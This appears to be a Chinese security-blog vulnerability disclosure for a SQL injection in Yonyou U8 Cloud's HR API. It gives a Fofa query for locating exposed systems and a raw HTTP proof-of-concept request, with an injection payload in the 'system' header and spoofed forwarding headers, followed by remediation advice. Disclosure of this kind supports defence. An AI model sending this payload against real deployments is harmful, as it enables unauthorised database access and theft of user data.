#  用友U8 Cloud hr SQL注入漏洞   
原创 jinyu  影域实验室   2024-04-20 16:57  
  
**免责声明：**  
  
本文所涉及的任何技术、信息或工具，仅供学习和参考之用。请勿利用本文提供的信息从事任何违法活动或不当行为。任何因使用本文所提供的信息或工具而导致的损失、后果或不良影响，均由使用者个人承担责任，与本文作者无关。作者不对任何因使用本文信息或工具而产生的损失或后果承担任何责任。使用本文所提供的信息或工具即视为同意本免责声明，并承诺遵守相关法律法规和道德规范。  
## 漏洞概述  
  
   
  
用友  
U8 Cloud HR  
系统的接口存在  
SQL  
注入漏洞，使得攻击者可以在无需授权的情况下访问数据库，并可能盗取用户数据，从而导致严重的用户信息泄露。  
## 漏洞复现  
### Fofa  
  
app=“用友-U8-Cloud”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SSx8HZMI5mvcGiaLr1SKrb2XGKHhmEPfq749VKCuxz9yuH1iaBH3aUh1icrpBKuiacHTOZKhJd8l6kj1g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SSx8HZMI5mvcGiaLr1SKrb2XQUKjEq5Arx6nCT4IFdQ8wiaAoFcd5vur48S487RaT93ofHbJ9WEzJew/640?wx_fmt=png&from=appmsg "")  
### Poc  
  
GET /u8cloud/api/hr HTTP/1.1  
  
Host: 127.0.0.1  
  
Pragma: no-cache  
  
Cache-Control: no-cache  
  
Upgrade-Insecure-Requests: 1  
  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36  
  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
  
system: -1' or 1=@@version--+  
  
Accept-Encoding: gzip, deflate, br  
  
Accept-Language: zh-CN,zh;q=0.9  
  
x-forwarded-for: 127.0.0.1  
  
x-originating-ip: 127.0.0.1  
  
x-remote-ip: 127.0.0.1  
  
x-remote-addr: 127.0.0.1  
  
Connection: close  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sMuor7fV7SSx8HZMI5mvcGiaLr1SKrb2X2Y5x0Sibv7qROeYakoUK2SdaSMV8Axop3rLXiaxPvwicJLd3tkic43BV5Q/640?wx_fmt=png&from=appmsg "")  
  
**由于该漏洞可利用资产比较多，防止恶意利用，公众号回复**  
  
**关键字**  
**【****20240420****】****获取POC**  
  
**点击下方名片进入公众号，欢迎关注！**  
## 修复建议  
  
1、  
请联系厂商进行修复。  
  
2、  
如非必要，禁止公网访问该系统。  
  
3、使用预编译处理SQL查询语句。  
  
  
****  
                                                                    ![](https://mmbiz.qpic.cn/mmbiz_svg/gQQO820rz5XNHQEXdfic0ljVNTEYicK50JZIJXDJqvSsuuBXWtia9HIclJGtDWTzP9iczvowsvXI9iaQuicI3mZGrvzTLibYGzTZPRw/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
    
  
点个小赞你最好看  
##   
  
  
  
